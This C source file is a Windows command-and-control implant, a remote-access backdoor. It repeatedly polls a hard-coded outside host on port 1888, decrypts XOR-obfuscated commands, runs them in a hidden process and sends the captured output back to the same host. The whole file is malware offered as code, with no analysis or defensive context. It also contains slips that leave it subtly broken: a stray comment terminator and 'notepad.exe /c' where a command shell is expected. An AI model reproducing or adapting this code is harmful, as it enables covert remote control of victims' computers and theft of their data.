#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#define C2_SERVER "cartoonnetwork.com:1888"
#define BEACON_INTERVAL 14005
#define XOR_KEY 0x83

void xor_encrypt_decrypt(char* data, size_t length) {
	for (size_t i = 0; i < length; i++) {
		data[i] ^= XOR_KEY;
	}
}

void SendResultToServer(const char* result) {
	size_t result_len = lstrlenA(result); 
	char* encrypted = (char*)malloc(result_len + 1);
	lstrcpyA(encrypted, result);

	xor_encrypt_decrypt(encrypted, result_len);

	HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!hInternet) {
		free(encrypted);
		return;
	}
	HINTERNET hConnect = InternetConnect(hInternet, "cartoonnetwork.com", 1888, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (!hConnect) {
		InternetCloseHandle(hInternet);
		free(encrypted);
		return;
	}

	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/result", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);

	if (hRequest) {
		HttpSendRequest(hRequest, NULL, 0, (LPVOID)encrypted, result_len);
		InternetCloseHandle(hRequest);
	}

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	free(encrypted);
}

void ExecuteCommand(char* cmd) {
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE; 
	sa.lpSecurityDescriptor = NULL;

	HANDLE hStdoutRead, hStdoutWrite;

	if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
		/*printf("CreatePipe failed");*/
		return;
	}

	SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0); 
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hStdoutWrite;
	si.wShowWindow = SW_HIDE; 
	char cmdLine[4096];
	lstrcpyA(cmdLine, "notepad.exe /c ");
	lstrcatA(cmdLine, cmd);

	if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
		CloseHandle(hStdoutRead);
		CloseHandle(hStdoutWrite);
		return;
	}

	CloseHandle(hStdoutWrite);
	char buffer[4096];
	char output[65536] = { 0 };
	DWORD bytesRead;
	size_t totalLength = 0;

	while (ReadFile(hStdoutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		if (totalLength + bytesRead < sizeof(output) - 1) {
			totalLength += bytesRead;*/
			for (DWORD i = 0; i < bytesRead && totalLength < sizeof(output) - 1; i++) {
				output[totalLength++] = buffer[i];
			}
			output[totalLength] = '\0';
		}
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hStdoutRead);
	SendResultToServer(output);
}

void Beacon() {
	while (1) {
		HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

		if (hInternet) {
			char url[256];
			/*snprintf(url, sizeof(url), "%s/poll", C2_SERVER);*/
			lstrcpy(url, C2_SERVER);
			lstrcat(url, "/poll");
			HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
			if (hConnect) {
				char buffer[4096];
				DWORD bytesRead;


				if (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
					buffer[bytesRead] = '\0';

					xor_encrypt_decrypt(buffer, bytesRead);
					ExecuteCommand(buffer);
				}

				InternetCloseHandle(hConnect);
			}
			InternetCloseHandle(hInternet);
		}
		Sleep(BEACON_INTERVAL);
	}
}

int main(void) {
	Beacon();
	return 0;
}
